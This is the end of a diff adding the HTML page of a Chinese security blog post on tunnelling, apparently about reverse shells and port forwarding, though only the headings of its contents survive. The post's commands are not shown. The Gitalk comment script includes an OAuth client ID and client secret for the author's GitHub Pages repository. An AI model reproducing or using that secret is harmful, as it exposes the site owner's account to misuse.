+          <div class="post-tags">
+              <a href="/tags/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i>内网学习</a>
+              <a href="/tags/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/" rel="tag"><i class="fa fa-tag"></i>隧道技术</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/03/17/%E5%88%A9%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E6%9E%84%E9%80%A0%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83/" rel="prev" title="利用防火墙构造内网环境">
+      <i class="fa fa-chevron-left"></i> 利用防火墙构造内网环境
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/03/22/%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E4%B9%8B-%E5%BA%94%E7%94%A8%E5%B1%82/" rel="next" title="隐藏通信隧道技术之 应用层">
+      隐藏通信隧道技术之 应用层 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-传输层隧道技术"><span class="nav-number">2.</span> <span class="nav-text">0x01 传输层隧道技术</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#LCX-端口转发"><span class="nav-number">2.1.</span> <span class="nav-text">LCX 端口转发</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1、内网端口转发"><span class="nav-number">2.1.1.</span> <span class="nav-text">1、内网端口转发</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2、本地端口映射"><span class="nav-number">2.1.2.</span> <span class="nav-text">2、本地端口映射</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#netcat-nc"><span class="nav-number">2.2.</span> <span class="nav-text">netcat(nc)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#nc的常用参数"><span class="nav-number">2.2.1.</span> <span class="nav-text">nc的常用参数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#获取Shell"><span class="nav-number">2.2.2.</span> <span class="nav-text">获取Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1、正向shell"><span class="nav-number">2.2.2.1.</span> <span class="nav-text">1、正向shell</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2、反向shell"><span class="nav-number">2.2.2.2.</span> <span class="nav-text">2、反向shell</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3、在目标主机中没有nc时获取反向shell"><span class="nav-number">2.2.2.3.</span> <span class="nav-text">3、在目标主机中没有nc时获取反向shell</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4、内网代理"><span class="nav-number">2.2.2.4.</span> <span class="nav-text">4、内网代理</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#powercat"><span class="nav-number">2.3.</span> <span class="nav-text">powercat</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1、安装"><span class="nav-number">2.3.1.</span> <span class="nav-text">1、安装</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2、利用powercat-g-生成payload"><span class="nav-number">2.3.2.</span> <span class="nav-text">2、利用powercat -g 生成payload</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3、powercat作为跳板"><span class="nav-number">2.3.3.</span> <span class="nav-text">3、powercat作为跳板</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="信安小蚂蚁"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">信安小蚂蚁</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">134</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">85</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/487280636@qq.com" title="E-Mail → 487280636@qq.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=487280636&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;487280636&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-instagram"></i>QQ</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/publicdomain/zero/1.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-zero.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">信安小蚂蚁</span>
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'Ov23li6cOHoOwCcszzi9',
+      clientSecret: '8f2a2156cf47355ba518edf71e62d5e1618dc229',
+      repo        : 'mayi077.github.io',
+      owner       : 'mayi077',
+      admin       : ['mayi077'],
+      id          : 'f3cb8a417da9a362f5001f29ce8f3d83',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
